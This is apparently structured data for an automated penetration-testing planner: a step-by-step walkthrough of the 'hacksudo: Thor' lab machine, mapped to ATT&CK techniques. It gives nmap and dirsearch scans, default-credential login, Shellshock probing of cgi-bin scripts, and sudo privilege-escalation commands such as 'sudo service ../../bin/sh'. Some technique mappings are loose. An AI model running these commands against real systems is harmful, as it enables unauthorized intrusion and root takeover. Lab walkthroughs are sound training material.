{
  "description": {
    "name": "hacksudo: Thor",
    "target": "获取靶机root权限和flag",
    "network_segment": "192.168.92.0/24",
    "operating_system": "unknown"
  },
  "steps": [
    {
      "sub_task_desc": "已知攻击机所在网段，并且靶机和攻击机处于同一网段下，应该执行发现IP地址任务来获取靶机IP地址。",
      "task": {
        "name": "发现IP地址",
        "order": "1",
        "tactics": "侦察目标",
        "techniques": "T1595.001 主动扫描.扫描IP块",
        "tool": ["Nmap"],
        "input": "network_segment",
        "output": "target_ip",
        "detailed_steps": [
          "使用nmap工具扫描靶机所在网段：nmap -sP 192.168.92.0/24，发现靶机IP地址为target_ip。"
        ]
      }
    },
    {
      "sub_task_desc": "已知目标靶机IP地址，应该执行扫描开放端口任务来获取靶机开放端口信息。",
      "task": {
        "name": "扫描开放端口",
        "order": "2",
        "tactics": "侦察目标",
        "techniques": "T1046 网络服务发现",
        "tool": ["Nmap"],
        "input": "target_ip",
        "output": "靶机开放端口信息",
        "detailed_steps": [
          "使用nmap工具扫描端口：nmap -A target_ip -p 1-65535，得到靶机开放端口：21、22、80。"
        ]
      }
    },
    {
      "sub_task_desc": "已知靶机IP地址，并且开放80端口，应该执行扫描目录任务来获取靶机web目录信息。",
      "task": {
        "name": "扫描目录",
        "order": "3",
        "tactics": "环境观察",
        "techniques": "T1595.003 主动扫描.单词列表扫描 ",
        "tool": ["dirsearch"],
        "input": ["target_ip", "靶机开放端口信息"],
        "output": "靶机web目录信息",
        "detailed_steps": [
          "由于HTTP协议的80端口处于开放状态，使用dirsearch工具对该网站进行目录爆破：dirsearch -u http://target_ip -e * ，发现两个敏感文件：/admin_login.php、/README.md。"
        ]
      }
    },
    {
      "sub_task_desc": "已知靶机IP地址，并且开放80端口，应该执行登录后台任务，在浏览器访问IP地址，看能否登录到后台。",
      "task": {
        "name": "登录后台",
        "order": "4",
        "tactics": "初始访问",
        "techniques": "T1078.001 有效账户.默认账户",
        "tool": ["browser"],
        "input": "target_ip:80",
        "output": "null",
        "detailed_steps": [
          "在/README.md文件中发现默认用户名和密码：admin:password123，尝试登录80端口网站后台，登录成功。"
        ]
      }
    },
    {
      "sub_task_desc": "已经获取靶机web目录信息，要探测靶机是否存在某种漏洞，应该进一步执行扫描目录任务，通过扫描目录特定后缀文件来寻找线索。",
      "task": {
        "name": "扫描目录",
        "order": "5",
        "tactics": "环境观察",
        "techniques": "T1595.003 主动扫描.单词列表扫描",
        "tool": ["dirsearch"],
        "input": "靶机web目录信息",
        "output": "可疑文件信息",
        "detailed_steps": [
          "查看news.php的源代码，发现一个cgi-bin，在前面使用web目录扫描时，同样也扫出了cgi-bin目录，因此要注意可能会存在破壳漏洞。",
          "使用dirsearch工具扫描cgi和sh后缀的文件：dirsearch -u http://target_ip/cgi-bin/ -f -e cgi,sh，发现`/cgi-bin/backup.cgi`和`/cgi-bin/shell.sh`。"
        ]
      }
    },
    {
      "sub_task_desc": "当扫描出可疑文件后，应该执行漏洞检测任务，对可疑文件进行漏洞扫描。",
      "task": {
        "name": "漏洞检测",
        "order": "6",
        "tactics": "侦察目标",
        "techniques": "T1595.002 主动扫描.漏洞扫描",
        "tool": ["Nmap"],
        "input": "可疑文件信息",
        "output": "漏洞信息",
        "detailed_steps": [
          "使用nmap工具对这两个文件进行破壳漏洞探测，发现backup.cgi和shell.sh都存在破壳漏洞，命令如下：①nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/backup.cgi,cmd=ls target_ip，②nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls target_ip。"
        ]
      }
    },
    {
      "sub_task_desc": "当确定靶机存在可利用的漏洞后，应该执行获取shell任务，利用漏洞来获取shell。",
      "task": {
        "name": "获取shell",
        "order": "7",
        "tactics": "执行攻击",
        "techniques": "T1059.004 命令和脚本解释器.Unix Shell",
        "tool": ["Root Terminal Emulator"],
        "input": "漏洞信息",
        "output": "shell信息",
        "detailed_steps": [
          "成功拿到shell"
        ]
      }
    },
    {
      "sub_task_desc": "当获取到靶机的普通用户权限后，应该执行提权任务，进一步提升权限，直至获取到root权限。",
      "task": {
        "name": "提权",
        "order": "8",
        "tactics": "权限提升",
        "techniques": "T1037.005 启动或登录初始化脚本.启动项",
        "tool": ["Root Terminal Emulator"],
        "input": "shell信息",
        "output": "root权限",
        "detailed_steps": [
          "执行命令sudo -l查看当前用户sudo权限，发现一个不需要密码就能以thor权限执行的hammer.sh脚本。因此运行/home/thor/./hammer.sh脚本，输入shell命令：sudo -u thor /home/thor/./hammer.sh，在秘密消息处(Secret massage)输入bash，成功提权到thor用户。",
          "使用sudo -l命令查看thor用户的sudo权限，发现可以无需密码就能以root权限使用cat命令，以及使用root权限运行service命令，因此直接使用service命令提权到root：sudo service ../../bin/sh。"
        ]
      }
    }
  ]
}



